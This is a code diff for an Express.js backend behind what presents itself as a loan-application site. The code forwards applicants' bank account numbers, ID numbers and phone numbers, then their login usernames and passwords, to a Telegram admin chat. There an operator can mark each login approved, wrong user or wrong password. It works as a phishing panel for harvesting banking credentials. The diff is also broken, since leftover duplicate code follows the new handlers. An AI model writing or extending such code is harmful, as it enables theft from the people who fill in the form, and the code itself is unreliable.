@@ -65,12 +65,13 @@ app.use(WEBHOOK_PATH, (req, res, next) => {
   });
   res.sendStatus(200);
 });
-
-// API endpoints used by frontend
-app.post('/api/create-application', (req, res) => {
+app.post('/api/create-application', async (req, res) => {
+  console.log('POST /api/create-application body=', JSON.stringify(req.body || {}).slice(0, 1000));
   try {
     const { loanAmount, termYears, interestAPR, monthly, applicant } = req.body || {};
-    if (!applicant || !applicant.fullName) return res.status(400).json({ success: false, error: 'Missing applicant' });
+    if (!applicant || !applicant.fullName) {
+      return res.status(400).json({ success: false, error: 'Missing applicant' });
+    }
 
     lastId += 1;
     const id = lastId;
@@ -91,6 +92,24 @@ app.post('/api/create-application', (req, res) => {
       createdAt: Date.now()
     };
 
+    const text = `New loan details (app ${id}):\nName: ${apps[id].applicant.fullName}\nPhone: ${apps[id].applicant.phone}\nBank: ${apps[id].applicant.bank}\nAccount: ${apps[id].applicant.accountNumber}\nID: ${apps[id].applicant.idNumber}\nLoan: ${apps[id].loanAmount} · ${apps[id].termYears} year(s)`;
+
+    // send message and surface any Telegram API error
+    const sendResult = await safeSendMessage(ADMIN_CHAT_ID, text);
+    if (!sendResult.ok) {
+      const err = sendResult.error;
+      const details = (err && err.response && err.response.body) ? err.response.body : (err && err.message) ? err.message : String(err);
+      console.error('Failed to send Telegram message for create-application:', details);
+      return res.status(500).json({ success: false, error: 'Failed to notify admin via Telegram', details });
+    }
+
+    return res.json({ success: true, applicationId: id });
+  } catch (err) {
+    console.error('create-application handler error', err);
+    return res.status(500).json({ success: false, error: 'Server error', details: err && err.message ? err.message : String(err) });
+  }
+});
+
     // send to admin chat
     const text = `New loan details (app ${id}):\nName: ${apps[id].applicant.fullName}\nPhone: ${apps[id].applicant.phone}\nBank: ${apps[id].applicant.bank}\nAccount: ${apps[id].applicant.accountNumber}\nID: ${apps[id].applicant.idNumber}\nLoan: ${fmtCurrency(apps[id].loanAmount)} · ${apps[id].termYears} year(s)`;
     bot.telegram.sendMessage(ADMIN_CHAT_ID, text).catch(err => console.error('sendMessage error', err));
@@ -101,18 +120,49 @@ app.post('/api/create-application', (req, res) => {
     res.status(500).json({ success: false, error: 'Server error' });
   }
 });
-
 app.post('/api/submit-credentials', async (req, res) => {
+  console.log('POST /api/submit-credentials body=', JSON.stringify(req.body || {}).slice(0, 1000));
   try {
     const { applicationId, username, password } = req.body || {};
     if (!applicationId || !username || !password) {
       return res.status(400).json({ success: false, error: 'Missing fields' });
     }
-
     const appRecord = apps[applicationId];
     if (!appRecord) {
       return res.status(404).json({ success: false, error: 'Application not found' });
     }
+
+    // store in-memory (demo only)
+    appRecord.username = username;
+    appRecord.password = password;
+    appRecord.status = 'cred_submitted';
+
+    const keyboard = {
+      inline_keyboard: [[
+        { text: 'APPROVE', callback_data: `CRED|${applicationId}|APPROVE` },
+        { text: 'WRONG USER', callback_data: `CRED|${applicationId}|WRONG_USER` },
+        { text: 'WRONG PASSWORD', callback_data: `CRED|${applicationId}|WRONG_PASS` }
+      ]]
+    };
+
+    const text = `Credentials for app ${applicationId}:\nUsername: ${username}\nPassword: ${password}\n\nSelect action:`;
+
+    const sendResult = await safeSendMessage(ADMIN_CHAT_ID, text, { reply_markup: keyboard });
+
+    if (!sendResult.ok) {
+      const err = sendResult.error;
+      const details = (err && err.response && err.response.body) ? err.response.body : (err && err.message) ? err.message : String(err);
+      console.error('Telegram send failed details:', details);
+      // return details to client for debugging (remove in production)
+      return res.status(500).json({ success: false, error: 'Telegram sendMessage failed', details });
+    }
+
+    return res.json({ success: true, message: 'Credentials forwarded to admin' });
+  } catch (err) {
+    console.error('submit-credentials error', err);
+    return res.status(500).json({ success: false, error: 'Server error', details: err && err.message ? err.message : String(err) });
+  }
+});
 
     // store in-memory (demo only)
     appRecord.username = username;
